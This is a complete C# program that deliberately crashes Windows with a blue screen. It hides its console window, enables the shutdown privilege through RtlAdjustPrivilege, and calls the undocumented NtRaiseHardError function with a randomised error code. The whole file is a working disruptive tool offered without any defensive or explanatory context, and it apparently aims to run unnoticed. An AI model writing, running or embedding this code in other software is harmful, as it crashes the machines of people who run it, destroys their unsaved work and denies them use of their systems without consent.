using System.Runtime.InteropServices;

namespace csharpBSOD;

class Program
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetPriorityClass(IntPtr hProcess, uint dwPriorityClass);

    [DllImport("ntdll.dll")]
    private static extern uint RtlAdjustPrivilege(int privilege, bool enable, bool currentThread, out bool enabled);

    [DllImport("ntdll.dll")]
    private static extern uint NtRaiseHardError(
        uint errorStatus,
        uint numberOfParameters,
        IntPtr unicodeStringParameterMask,
        IntPtr parameters,
        uint validResponseOptions,
        out uint response
    );

    private const int SW_HIDE = 0;
    private const uint HIGH_PRIORITY_CLASS = 0x00000080;
    private const uint STATUS_SUCCESS = 0x00000000;

    static void Main()
    {
        try
        {
            IntPtr consoleWindow = GetConsoleWindow();
            ShowWindow(consoleWindow, SW_HIDE);
            SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

            uint status = RtlAdjustPrivilege(19, true, false, out bool enabled);
            if (status != STATUS_SUCCESS)
            {
                Cleanup(status);
                return;
            }

            uint random = (uint)(DateTime.UtcNow.Ticks & 0xF_FFFF);
            uint bsodCode = 0xC000_0000 | ((random & 0xF00) << 8) | ((random & 0xF0) << 4) | (random & 0xF);
            uint bsodStatus = NtRaiseHardError(bsodCode, 0, IntPtr.Zero, IntPtr.Zero, 6, out uint response);

            if (bsodStatus != STATUS_SUCCESS) { Cleanup(bsodStatus); }
        }
        catch { }
    }

    private static void Cleanup(uint errorRet)
    {
        if (errorRet != STATUS_SUCCESS)
        {
            string message = $"Error code: 0x{errorRet:X8}";
            MessageBox(IntPtr.Zero, message, "Error", 0x00000030);
        }
    }

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
}
